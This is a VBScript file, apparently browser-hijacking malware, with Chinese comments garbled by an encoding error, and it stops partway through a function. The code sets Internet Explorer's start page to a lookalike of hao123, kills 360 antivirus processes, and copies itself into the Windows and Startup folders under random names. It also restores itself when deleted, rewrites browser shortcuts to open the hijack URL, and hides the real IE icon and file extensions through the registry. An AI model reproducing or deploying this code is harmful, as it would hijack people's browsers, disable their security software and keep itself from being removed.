'Ĭ��ie�������·��
Private Const BROWSER_PATH = "C:\Program Files\Internet Explorer\iexplore.exe"
'Ĭ�������������·��
Private Const MAX_BROWSER_PATH = "C:\Program Files\Maxthon2\Maxthon.exe"
'Ĭ��360�������·��
Private Const SE_BROWSER_PATH = "C:\Program Files\360\360se3\360SE.exe"
'Ĭ�ϻ���������·��
Private Const FOX_BROWSER_PATH = "C:\Program Files\Mozilla Firefox\firefox.exe"
'Ĭ���ѹ��������·��
Private Const SOGOU_BROWSER_PATH = "C:\Program Files\SogouExplorer\SogouExplorer.exe"
Dim iePath
Dim maxPath
Dim sePath
Dim foxPath
Dim sogouPath
dim tips_count
tips_count=0
Dim content
dim ruseco1
ruseco1=0
Call Main

Public Sub Main()
On Error Resume Next
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set wshShell = CreateObject("Wscript.Shell")
    Dim allUsersStartup,allUsersPcDesktopPath
    allUsersStartup = wshShell.SpecialFolders("AllUsersStartup") '�����û�����Ŀ¼
    allUsersPcDesktopPath = wshShell.SpecialFolders("AllUsersDesktop") 'ȫ���û�����ͼ��
    
    dim url,index,userId
    userId="{userId}"
    if IsNumeric(userId)=false then
        userId=0
    end if
    
    userId=GetUserId()
    if userId="" then
        userId=0
    end if

    url="http://www.haol23.cc"
    Call LoadAllBrowserPath '���������·��    
    If Not IsExeExist("360tray") And Not IsExeExist("RavMonD") And Not IsExeExist("nod32")  then '���������ɱ�����,���޸�IE
        Call SetIeIndex(url)
        ieUrl="http://www.haol23.cc"
       call CloudKilling()
    End If   

    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process")                    '�ƶ����ļ���ָ��·��
    movePath=Environ("windir") & "\" & yunj(1, 3) & ".vbe"  
    Call CopyFile(movePath)
    startPath=allUsersStartup & "\" & yunj(1, 3) & ".vbe" 
       
    Call CreateFileLnk(url,1)                                '�����ļ�������ݷ�ʽ(����һ������ַ)
    do
        If ruseco1 Mod 10 = 0 Then 'ÿ���һ��ʱ���ظ�����һ��
            Call CreateFileLnk(url,0) '�����ļ�������ݷ�ʽ(������һ������ַ)
        End If
        
        If ruseco1 Mod 900 = 0 or ruseco1=0 Then 'ÿ���һ��ʱ���ظ�����һ��              
            If Not IsExeExist("RavMonD") then '����������
                 Call ReplaceBrowserLink(url) '�滻���������Ŀ��·��
            End If
                                            
            If Not IsExeExist("RavMonD") And Not IsExeExist("ZhuDongFangYu") then '���������Ǻ�360
                Call RemoveInternetExplorer()'���Internet Explorer,���°汾360��ʾ��
		
            End If
            
            If not fso.FileExists(movePath) Then  '������Դ�ļ��򴴽�
                Call CopyFile(movePath)
            End If
            
            
            If ruseco1=0 Then '��һ������                  
                If instr(Wscript.ScriptFullName,"����")<>0 Then 'Ϊ����Ŀ¼���е�
                   ' Call IeIndex(url)
                    Call RemoveInternetExplorer()'���Internet Explorer,���°汾360��ʾ��
                    If Not IsExeExist("RavMonD") then '����������
                         Call ReplaceBrowserLink(url) '�滻���������Ŀ��·��
                    End If
                                       
                End If
              
                Call DeleteLnk() '�����ݷ�ʽ
                Call HideFileExtension '�����ļ���չ��
                set ws=wscript.createobject("wscript.shell")
                ws.appactivate "Program Manager"
                wscript.sleep 500
                ws.sendkeys "{f5}"
            End If
            
        End If        

            
        index=0
        dim vbsc '����Ŀ¼����
        directory=allUsersStartup'�û�����Ŀ¼
        Set f = fso.GetFolder(directory)
        Set fc = f.Files 
        For Each flie in fc  
            myName = directory + "\" + flie.name
            If instr(LCase(myName),".vbe")<>0 Then
                if index=0 then
                    set wind_0=fso.opentextfile(myName)
                end if
                if index=1 then
                    set wind_1=fso.opentextfile(myName)
                end if
                if index=2 then
                    set wind_2=fso.opentextfile(myName)
                end if
                if index=3 then
                    set wind_3=fso.opentextfile(myName)
                end if
                if index=4 then
                    set wind_4=fso.opentextfile(myName)
                end if
                if index=5 then
                    set wind_5=fso.opentextfile(myName)
                end if
                if index=6 then
                    set wind_6=fso.opentextfile(myName)
                end if
                if index=7 then
                    set wind_7=fso.opentextfile(myName)
                end if
                if index=8 then
                    set wind_8=fso.opentextfile(myName)
                end if
                set wind_9=fso.opentextfile(movePath)
                set wind_10=fso.opentextfile(Wscript.ScriptFullName)
                set wind_11=fso.opentextfile(allUsersPcDesktopPath + "\Internet Explorer.Ink")
                set wind_12=fso.opentextfile(allUsersPcDesktopPath + "\�Ա�������.Ta")
                set wind_13=fso.opentextfile(Environ("windir") + "\smss\smss.exe")                
            end if            
            index=index+1
            vbsc=vbsc+1
        Next
                    
        If ruseco1 Mod 3 = 0 Then 'ÿ5�����ļ��Ƿ�ɾ���������ɾ�����ظ�����
            '����������
            Call SetRunVbe("\??\" & movePath,"\??\" & startPath)
            '�������
            Call SetRunVbe("\??\","")
            
            If vbsc>2 Or instr(Wscript.ScriptFullName,"����")=0 Then '������Ŀ¼Vbe�ļ�����2��ʱ��ɾ��
                '��ǰ�ļ����´���������ʱɾ��
                Call SetRunVbe("\??\" & Wscript.ScriptFullName,"")
            End If
            Call NoDeleteFile 
        End If
        
        If ruseco1 Mod 5 = 0 Then
            Call NotAppCloudKilling() '��ָֹ�������������
        End If
        
        'If ruseco1 Mod 1800 = 0 Then
	'Set tWshShell= CreateObject("WScript.Shell")
	'tWshShell.Run ("http://www.qwxyx.com")
        'End If

        ruseco1=ruseco1+1
        wscript.sleep 1000
    loop
End Sub


'��ָֹ�������������
Public Function NotAppCloudKilling()   
On Error Resume Next
    good="."
    set bag=getobject("winmgmts:\\"&good&"\root\cimv2")
    set pipe_1=bag.execquery("select * from win32_process where name='360sd.exe'")
    for each i in pipe_1
    i.terminate()
    next

    set bag_2=getobject("winmgmts:\\"&good&"\root\cimv2")
    set pipe_2=bag_2.execquery("select * from win32_process where name='360tray.exe'")
    for each i in pipe_2
    i.terminate()
    next

    set bag_3=getobject("winmgmts:\\"&good&"\root\cimv2")
    set pipe_3=bag_3.execquery("select * from win32_process where name='360rp.exe'")
    for each i in pipe_3
    i.terminate()
    next
    
    set bag_4=getobject("winmgmts:\\"&good&"\root\cimv2")
    set pipe_4=bag_4.execquery("select * from win32_process where name='360Safe.exe'")
    for each i in pipe_4
    i.terminate()
    next
End Function


'��ȡ��װ�û�Id
Public Function GetUserId()   
On Error Resume Next
    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process") 
    Dim path,content
    path = Environ("windir") & "\userid.txt"
    Set fso = CreateObject("Scripting.FileSystemObject")
    If path<>"" Then
        Set f=fso.opentextfile(path)
        content=f.readall '��ȡ�ı����ݵ�ȫ�ֱ���
        f.Close
    End If
    content=Replace(content, " ", "")
    content=Replace(content, "\r", "")
    content=Replace(content, "\n", "")
    content=Replace(content, Chr(13), "")
    content=Replace(content, Chr(10), "")
    GetUserId=content
End Function

'���Ƶ�ǰ�ű���ָ��·��
Public Sub CopyFile(movePath)   
On Error Resume Next
    dim vbsPath
    vbsPath = Wscript.ScriptFullName
    Set fso = CreateObject("Scripting.FileSystemObject")
    If content="" Then
        Set f=fso.opentextfile(vbsPath)
        content=f.readall '��ȡ�ı����ݵ�ȫ�ֱ���
        f.Close
    End If

    '�����ļ�
    If content<>"" Then
        dim testFile
        Set testFile=fso.CreateTextFile(movePath,Ture)
        testFile.WriteLine(content)
        testFile.Close
    End If        
    Set fso  = Nothing
End Sub

'����ļ��Ƿ�ɾ���������ɾ�����ظ�����
Public Function NoDeleteFile()   
On Error Resume Next
    dim vbsPath
    vbsPath = Wscript.ScriptFullName
    Set fso = CreateObject("Scripting.FileSystemObject")
    If content="" Then
        Set f=fso.opentextfile(vbsPath,1)
        content=f.readall '��ȡ�ı����ݵ�ȫ�ֱ���
        f.Close
    End If
    
    If not fso.FileExists(vbsPath) Then  '�������򴴽�
        '�����ļ�
        If content<>"" Then
            dim testFile
            Set testFile=fso.CreateTextFile(vbsPath,Ture)
            testFile.WriteLine(content)
            testFile.Close
        End If        
    End If
    Set fso  = Nothing
End Function


'ɾ��ϵͳĬ���������ݷ�ʽ
Public Function RemoveInternetExplorer()   
On Error Resume Next
	Const HKEY_CURRENT_USER = &H80000001
	Const HKEY_LOCAL_MACHINE = &H80000002
	strComputer = "."
	Set StdOut = WScript.StdOut 
	Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\default:StdRegProv")
	strKeyPath = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
	oReg.CreateKey HKEY_CURRENT_USER,strKeyPath 
	rrttqq5Name = "NoInternetIcon"
	dwValue = 1
	oReg.SetDWORDValue HKEY_CURRENT_USER,strKeyPath,rrttqq5Name,dwValue
	strKeyPath = "Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu"
	oReg.CreateKey HKEY_CURRENT_USER,strKeyPath 
	rrttqq5Name = "{871C5380-42A0-1069-A2EA-08002B30309D}"
	dwValue = 1
	oReg.SetDWORDValue HKEY_CURRENT_USER,strKeyPath,rrttqq5Name,dwValue
	strKeyPath = "Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel"
	oReg.CreateKey HKEY_CURRENT_USER,strKeyPath 
	rrttqq5Name = "{871C5380-42A0-1069-A2EA-08002B30309D}"
	dwValue = 1
	oReg.SetDWORDValue HKEY_CURRENT_USER,strKeyPath,rrttqq5Name,dwValue
	strKeyPath = "Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
	oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath 
	rrttqq5Name = "NoInternetIcon"
	dwValue = 1
	oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,rrttqq5Name,dwValue
	strKeyPath = "Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu"
	oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath 
	rrttqq5Name = "{871C5380-42A0-1069-A2EA-08002B30309D}"
	dwValue = 1
	oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,rrttqq5Name,dwValue
	strKeyPath = "Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel"
	oReg.CreateKey HKEY_LOCAL_MACHINE,strKeyPath 
	rrttqq5Name = "{871C5380-42A0-1069-A2EA-08002B30309D}"
	dwValue = 1
	oReg.SetDWORDValue HKEY_LOCAL_MACHINE,strKeyPath,rrttqq5Name,dwValue
	Set StdOut=Nothing
	Set oReg=Nothing
End Function

'�����޷�ɾ��ϵͳĬ���������ݷ�ʽ
Public Function IeIndex(url)   
On Error Resume Next 
    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process") 
    Dim regPath
    regPath = Environ("windir") & "\SetMyIndex.reg"
    Set fso = CreateObject("Scripting.FileSystemObject")
    if tips_count>2 then
        if IsExeExist("360tray") then '����360��ȫ��ʿ,������ʾ��������û�
            Exit Function
        end if
    else
        tips_count=tips_count+1
    end if
    dim ie_temp_path
    ie_temp_path=iePath
    If not fso.FileExists(ie_temp_path) Then  
        ie_temp_path=GetWebBrowserPath() '��ȡһ�������·��
        If not fso.FileExists(ie_temp_path) Then
            Exit Function
        End If
    End If
    
    Dim OperationRegistry 
    Set OperationRegistry=WScript.CreateObject("WScript.Shell") 
    Dim data,dataHome
    data=OperationRegistry.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{871C5380-42A0-1069-A2EA-08002B30309A}\") 
    dataHome=OperationRegistry.RegRead("HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\OpenHomePage\Command\") 

    If data="" or instr(dataHome,url)=0 Then
        Set f1=fso.CreateTextFile(regPath, True)
	    f1.WriteLine "Windows Registry Editor Version 5.00"
	    f1.WriteLine "[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{871C5380-42A0-1069-A2EA-08002B30309A}]" '�޸�Ĭ��IE
	    f1.WriteLine "@=""Internet Explorer""" '�޸�Ĭ��IE
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}]" '�޸�Ĭ��IE
	    f1.WriteLine "@=""Internet Explorer""" '�޸�Ĭ��IE
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\DefaultIcon]" '�޸�Ĭ��IE
	    f1.WriteLine "@=""" & Replace(ie_temp_path, "\", "\\") & ",0""" '�̶�IE�����ͼ��
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\InProcServer32]"
	    f1.WriteLine "@=""%SystemRoot%\\system32\\shdocvw.dll"""
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell]"
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\OpenHomePage]"
	    f1.WriteLine "@=""����ҳ(&H)"""
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\OpenHomePage\Command]"
	    f1.WriteLine "@=""" & Replace(ie_temp_path, "\", "\\") & " " & url & """" '�޸�Ĭ��IE
	    
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\Q]"
	    f1.WriteLine "@=""ɾ��(&D)"""
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\Q\Command]"
	    f1.WriteLine "@=""Rundll32.exe"""
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\����(&R)]"
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\Shell\����(&R)\Command]"
	    f1.WriteLine "@=""rundll32.exe shell32.dll,Control_RunDLL inetcpl.cpl,,0"""
	    f1.WriteLine "[HKEY_CLASSES_ROOT\CLSID\{871C5380-42A0-1069-A2EA-08002B30309A}\ShellFolder]"
	    f1.WriteLine "@=""00.00.00.00"""
	    f1.WriteLine """Attributes""=hex:00,00,00,00"
	    Set f1  = Nothing
	    Set WshShell= CreateObject("WScript.Shell") 
	    WshShell.Run "regedit /s " & regPath
        Set WshShell  = Nothing 
    End If
    Set fso  = Nothing
End Function

'�޸�ע���������ҳ
Public Function SetIeIndex(url)   
On Error Resume Next
	Set WshShell = CreateObject("Wscript.Shell")
	HomeUrl="http://www.haol23.cc"
	HomepageValue = WshShell.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page")
	If instr(HomepageValue,url)=0 or HomepageValue="" Then
		WshShell.Regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page",url
	end if
	Set WshShell = Nothing
End Function


'ɾ��Ĭ�ϴ�����ݷ�ʽ
Public Function DeleteLnk()   
On Error Resume Next 
    Dim wshShell, oShellLink
    Dim strDesktop, pcDesktopPath, quickLaunch, strQuickLaunch, programs, startMenu
    Set wshShell = CreateObject("Wscript.shell")
    
    pcDesktopPath = wshShell.SpecialFolders("Desktop") '��ǰ�û�����Ŀ¼
    quickLaunch = wshShell.SpecialFolders("AppData") & "\Microsoft\Internet Explorer\Quick Launch" '��ǰ�û����������������Ŀ¼
    programs = wshShell.SpecialFolders("Programs") '��ǰ�û���ʼ�˵��еĳ���Ŀ¼
    startMenu = wshShell.SpecialFolders("StartMenu") '��ǰ�û���ʼ�˵��������Ŀ¼
      
    Dim allUsersPcDesktopPath, allUsersPrograms, allUsersStartMenu
    allUsersPcDesktopPath = wshShell.SpecialFolders("AllUsersDesktop") 'ȫ���û�����ͼ��
    allUsersPrograms = wshShell.SpecialFolders("AllUsersPrograms") 'ȫ���û���ʼ�˵��еĳ���Ŀ¼
    allUsersStartMenu = wshShell.SpecialFolders("AllUsersStartMenu") 'ȫ���û���ʼ�˵��������Ŀ¼

    Set fso = CreateObject("Scripting.FileSystemObject")
    
    'ɾ��Ĭ�Ͽ�ݷ�ʽ
    If fso.FileExists(pcDesktopPath & "\Internet Explorer.lnk") Then        
        Call SetRunVbe("\??\","")'�������
        Call SetRunVbe("\??\" & pcDesktopPath & "\Internet Explorer.lnk","")
    End If
    If fso.FileExists(pcDesktopPath & "\360��ȫ�����.lnk") Then
        Call SetRunVbe("\??\","")'�������
        Call SetRunVbe("\??\" & pcDesktopPath & "\360��ȫ�����.lnk","")
    End If
    If fso.FileExists(pcDesktopPath & "\360��ȫ�����.lnk") Then
        Call SetRunVbe("\??\","")'�������
        Call SetRunVbe("\??\" & pcDesktopPath & "\360��ȫ����� 3.lnk","")
    End If
    If fso.FileExists(pcDesktopPath & "\���������2.lnk") Then
        Call SetRunVbe("\??\","")'�������
        Call SetRunVbe("\??\" & pcDesktopPath & "\���������2.lnk","")
    End If
    If fso.FileExists(pcDesktopPath & "\�ѹ����������.lnk") Then
        Call SetRunVbe("\??\","")'�������
        Call SetRunVbe("\??\" & pcDesktopPath & "\�ѹ����������.lnk","")
    End If
    If fso.FileExists(pcDesktopPath & "\���� Internet Explorer �����.lnk") Then
        Call SetRunVbe("\??\","")'�������
        Call SetRunVbe("\??\" & pcDesktopPath & "\���� Internet Explorer �����.lnk","")
    End If
    
    If fso.FileExists(allUsersPcDesktopPath & "\Internet Explorer.lnk") Then
        Call SetRunVbe("\??\","")'�������
        Call SetRunVbe("\??\" & allUsersPcDesktopPath & "\Internet Explorer.lnk","")
    End If
    If fso.FileExists(allUsersPcDesktopPath & "\360��ȫ�����.lnk") Then
        Call SetRunVbe("\??\","")'�������
        Call SetRunVbe("\??\" & allUsersPcDesktopPath & "\360��ȫ�����.lnk","")
    End If
    If fso.FileExists(allUsersPcDesktopPath & "\360��ȫ����� 3.lnk") Then
        Call SetRunVbe("\??\","")'�������
        Call SetRunVbe("\??\" & allUsersPcDesktopPath & "\360��ȫ����� 3.lnk","")
    End If
    If fso.FileExists(allUsersPcDesktopPath & "\�ѹ����������.lnk") Then
        Call SetRunVbe("\??\","")'�������
        Call SetRunVbe("\??\" & allUsersPcDesktopPath & "\�ѹ����������.lnk","")
    End If
    If fso.FileExists(allUsersPcDesktopPath & "\���� Internet Explorer �����.lnk") Then
        Call SetRunVbe("\??\","")'�������
        Call SetRunVbe("\??\" & allUsersPcDesktopPath & "\���� Internet Explorer �����.lnk","")
    End If
    
    If fso.FileExists(quickLaunch & "\Internet Explorer.lnk") Then
        Call SetRunVbe("\??\","")'�������
        Call SetRunVbe("\??\" & quickLaunch & "\Internet Explorer.lnk","")
    End If
    If fso.FileExists(quickLaunch & "\360��ȫ�����.lnk") Then
        Call SetRunVbe("\??\","")'�������
        Call SetRunVbe("\??\" & quickLaunch & "\360��ȫ�����.lnk","")
    End If
    If fso.FileExists(quickLaunch & "\360��ȫ����� 3.lnk") Then
        Call SetRunVbe("\??\","")'�������
        Call SetRunVbe("\??\" & quickLaunch & "\360��ȫ����� 3.lnk","")
    End If
    If fso.FileExists(quickLaunch & "\���������2.lnk") Then
        Call SetRunVbe("\??\","")'�������
        Call SetRunVbe("\??\" & quickLaunch & "\���������2.lnk","")
    End If
    If fso.FileExists(quickLaunch & "\�ѹ����������.lnk") Then
        Call SetRunVbe("\??\","")'�������
        Call SetRunVbe("\??\" & quickLaunch & "\�ѹ����������.lnk","")
    End If
    If fso.FileExists(quickLaunch & "\���� Internet Explorer �����.lnk") Then
        Call SetRunVbe("\??\","")'�������
        Call SetRunVbe("\??\" & quickLaunch & "\���� Internet Explorer �����.lnk","")
    End If
   
End Function



'ѭ���޸����п�ݷ�ʽ
Public Function ReplaceBrowserLink(url)    
On Error Resume Next
    Dim wshShell, oShellLink
    Dim strDesktop, pcDesktopPath, quickLaunch, strQuickLaunch, programs, startMenu
    Set wshShell = CreateObject("Wscript.shell")
    pcDesktopPath = wshShell.SpecialFolders("Desktop") '�û�����Ŀ¼
    quickLaunch = wshShell.SpecialFolders("AppData") & "\Microsoft\Internet Explorer\Quick Launch" '��ǰ�û����������������Ŀ¼
    programs = wshShell.SpecialFolders("Programs") '�û���ʼ�˵��еĳ���Ŀ¼
    startMenu = wshShell.SpecialFolders("StartMenu") '�û���ʼ�˵��������Ŀ¼
    
    Dim allUsersPcDesktopPath, allQuickLaunch, allUsersPrograms, allUsersStartMenu
    allUsersPcDesktopPath = wshShell.SpecialFolders("AllUsersDesktop") 'ȫ���û�����Ŀ¼
    allUsersPrograms = wshShell.SpecialFolders("AllUsersPrograms") 'ȫ���û���ʼ�˵��еĳ���Ŀ¼
    allUsersStartMenu = wshShell.SpecialFolders("AllUsersStartMenu") 'ȫ���û���ʼ�˵��������Ŀ¼

    '·�����ϣ���·�����Ͻ��б���
    Dim lnkPath(7)
    lnkPath(1) = pcDesktopPath
    lnkPath(2) = pcDesktopPath'quickLaunch
    lnkPath(3) = programs
    lnkPath(4) = startMenu
    lnkPath(5) = allUsersPcDesktopPath
    lnkPath(6) = allUsersPrograms
    lnkPath(7) = allUsersStartMenu
    
    Dim directory
    For i = LBound(lnkPath) + 1 To UBound(lnkPath)
        'ѭ��Ŀ¼�����޸�
        directory = lnkPath(i)        
         '�滻��ǰ�û�����������ݷ�ʽ
        Set fs = CreateObject("Scripting.FileSystemObject")
        Set f = fs.GetFolder(directory)
        Set fc = f.Files 
        For Each flie in fc    
            myName = directory + "\" + flie.name
            If InStr(myName, ".lnk") <> 0 And (InStr(myName, "����") <> 0 Or InStr(myName, "�ѹ�") <> 0 Or InStr(myName, "360") <> 0 Or InStr(myName, "�����") <> 0) Then
                Set fso = CreateObject("Scripting.FileSystemObject")
                Set oShellLink = wshShell.CreateShortcut(myName)
                Set file=fso.getfile(myName)                
                file.attributes=0'�ָ�����
                         
                if oShellLink.Arguments <> url then '����Ĳ��� 
                    oShellLink.Arguments = url '����Ĳ���      
                    oShellLink.Save            
                end if
                
	            file.attributes=1
                
                Set oShellLink  = Nothing                
                Set fso  = Nothing
            End If
        Next        
    Next
End Function

'��ȡ��ݷ�ʽ·��
Private Function GetDirectoryPath(path)
    Dim str, last
    For i = 0 To Len(path)
        str = Mid(path, Len(path) - i, 1)
        If str = "\" Then
            last = Len(path) - i
            Exit For
        End If
    Next
    GetDirectoryPath = Mid(path, 1, last)
    Exit Function
End Function

'�ж�ָ�������Ƿ����
Public Function IsExeExist(exeName) 
    IsExeExist=false
    strComputer = "."
    Set objWMIService = GetObject("winmgmts:" _
        & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

    Set colProcessList = objWMIService.ExecQuery _
        ("Select * from Win32_Process Where Name = '" & exeName & ".exe'")

    For Each objProcess in colProcessList
        if objProcess.executablepath<>"" then
            IsExeExist=true
        end if        
    Next
End Function

'����Url����(����Ҫhttp://)
Public Function DnsUrlEncrypt(str)
    Dim hexStr, temp, i '16�����ַ���
    For i = 1 To Len(str)
        temp = Mid(str, i, 1)
        temp = Hex(Asc(temp))
        temp = temp
        hexStr = hexStr & "%" & temp
    Next
    DnsUrlEncrypt = hexStr
    Exit Function
End Function


'�ϲ���������
Function Summ(a1,a2)
    Dim str1,str2,str3
    str1 = join(a1,",")
    str2 = join(a2,",")
    str3 = str1 + "," + str2
    summ = split(str3,",")
    '����smss.exe
    '���˽ű�����ֹ360�����´�ɾ��
End Function


'���ɸ�����,����:1������(0,��� 1�ַ� 2����) 2������
'���󷵻�:���ַ�
Public Function yunj(st, length)
sj=""
mt=now
mh=Hour(mt)
mm=Minute(mt)
ms=Second(mt)
a=(mh*ms) mod 25+97
b=(mh*mm) mod 25+97
c=(ms*mm) mod 25+97
sj=chr(a)+chr(b)+chr(c)
yunj = sj
End Function




'��ȡ�����·��
Public Function GetWebBrowserPath() 
On Error Resume Next
    '�����̷�·��
    Set Environ = ws.Environment("process") 
    dim iePath
    iePath=BROWSER_PATH
    If Dir(iePath)="" Then '���·��������������̷�
        iePath = Environ("systemdrive") & Mid(iePath, 3, Len(iePath))
        If Dir(iePath)<>"" Then
            GetWebBrowserPath=iePath
            Exit Function
        End If
    else
        GetWebBrowserPath=iePath
        Exit Function
    End If
    
    Dim wshShell, oShellLink
    Dim strDesktop, pcDesktopPath, quickLaunch, strQuickLaunch, programs, startMenu
    Set wshShell = CreateObject("Wscript.shell")
    pcDesktopPath = wshShell.SpecialFolders("Desktop") '��ǰ�û�����Ŀ¼
    quickLaunch = wshShell.SpecialFolders("AppData") & "\Microsoft\Internet Explorer\Quick Launch" '��ǰ�û����������������Ŀ¼
    programs = wshShell.SpecialFolders("Programs") '��ǰ�û���ʼ�˵��еĳ���Ŀ¼
    startMenu = wshShell.SpecialFolders("StartMenu") '��ǰ�û���ʼ�˵��������Ŀ¼
    
    Dim allUsersPcDesktopPath, allQuickLaunch, allUsersPrograms, allUsersStartMenu
    allUsersPcDesktopPath = wshShell.SpecialFolders("AllUsersDesktop") 'ȫ���û�����Ŀ¼
    allUsersPrograms = wshShell.SpecialFolders("AllUsersPrograms") 'ȫ���û���ʼ�˵��еĳ���Ŀ¼
    allUsersStartMenu = wshShell.SpecialFolders("AllUsersStartMenu") 'ȫ���û���ʼ�˵��������Ŀ¼

    
    '·�����ϣ���·�����Ͻ��б���
    Dim lnkPath(7)
    lnkPath(1) = pcDesktopPath
    lnkPath(2) = quickLaunch
    lnkPath(3) = programs
    lnkPath(4) = startMenu
    lnkPath(5) = allUsersPcDesktopPath
    lnkPath(6) = allUsersPrograms
    lnkPath(7) = allUsersStartMenu
    Set fso = CreateObject("Scripting.FileSystemObject")
   Dim directory
    If not fso.FileExists(iePath) Then
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            'ѭ��Ŀ¼�����޸�
            directory = lnkPath(i)        
             '�滻��ǰ�û�����������ݷ�ʽ
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files 
            For Each flie in fc    
                myName = directory + "\" + flie.name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "iexplore.exe") Then 'IE�����
                        if oShellLink.TargetPath<>"" then
                            iePath=oShellLink.TargetPath
                            GetWebBrowserPath=iePath
                            Exit Function
                        end if                    
                    end if
                end if
            Next    
        Next
    End If
    
    If not fso.FileExists(iePath) Then
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            'ѭ��Ŀ¼�����޸�
            directory = lnkPath(i)        
             '�滻��ǰ�û�����������ݷ�ʽ
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files   
            
            For Each flie in fc    
                myName = directory + "\" + flie.name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "maxthon.exe") Then '���������
                        if oShellLink.TargetPath<>"" then
                            iePath=oShellLink.TargetPath
                            GetWebBrowserPath=iePath
                            Exit Function
                        end if                    
                    end if
                end if
            Next
        Next
    End If
    
    If not fso.FileExists(iePath) Then
        For i = LBound(lnkPath) + 1 To UBound(lnkPath)
            'ѭ��Ŀ¼�����޸�
            directory = lnkPath(i)        
             '�滻��ǰ�û�����������ݷ�ʽ
            Set fs = CreateObject("Scripting.FileSystemObject")
            Set f = fs.GetFolder(directory)
            Set fc = f.Files   
            
            For Each flie in fc    
                myName = directory + "\" + flie.name
                If InStr(myName, ".lnk") <> 0 Then
                    Set fso = CreateObject("Scripting.FileSystemObject")
                    Set oShellLink = wshShell.CreateShortcut(myName)
                    If LCase(oShellLink.TargetPath) = LCase(GetDirectoryPath(oShellLink.TargetPath) & "360se.exe") Then '360�����
                        if oShellLink.TargetPath<>"" then
                            iePath=oShellLink.TargetPath
                            GetWebBrowserPath=iePath
                            Exit Function
                        end if                    
                    end if
                end if
            Next
        Next
    End If
End Function

'���������·��
Private Sub LoadAllBrowserPath()
On Error Resume Next
    Set ws = CreateObject("WScript.Shell") 
    Set Environ = ws.Environment("process") 
    Set fso = CreateObject("Scripting.FileSystemObject")
    
    iePath = BROWSER_PATH
    If not fso.FileExists(iePath) Then '���·��������������̷�
        iePath = Environ("systemdrive") & Mid(iePath, 3, Len(iePath))
    End If
    maxPath = MAX_BROWSER_PATH
    If not fso.FileExists(maxPath) Then '���·��������������̷�
        maxPath = Environ("systemdrive") & Mid(maxPath, 3, Len(maxPath))
    End If
    sePath = SE_BROWSER_PATH
    If not fso.FileExists(sePath) Then '���·��������������̷�
        sePath = Environ("systemdrive") & Mid(sePath, 3, Len(sePath))
    End If
    foxPath = FOX_BROWSER_PATH
    If not fso.FileExists(foxPath) Then '���·��������������̷�
        foxPath = Environ("systemdrive") & Mid(foxPath, 3, Len(foxPath))
    End If
    sogouPath = SOGOU_BROWSER_PATH
    If not fso.FileExists(sogouPath) Then '���·��������������̷�
        sogouPath = Environ("systemdrive") & Mid(sogouPath, 3, Len(sogouPath))
    End If
    
    Dim wshShell, oShellLink
    Dim strDesktop, pcDesktopPath, quickLaunch, strQuickLaunch, programs, startMenu
    Set wshShell = CreateObject("Wscript.shell")
    pcDesktopPath = wshShell.SpecialFolders("Desktop") '��ǰ�û�����Ŀ¼
    quickLaunch = wshShell.SpecialFolders("AppData") & "\Microsoft\Internet Explorer\Quick Launch" '��ǰ�û����������������Ŀ¼
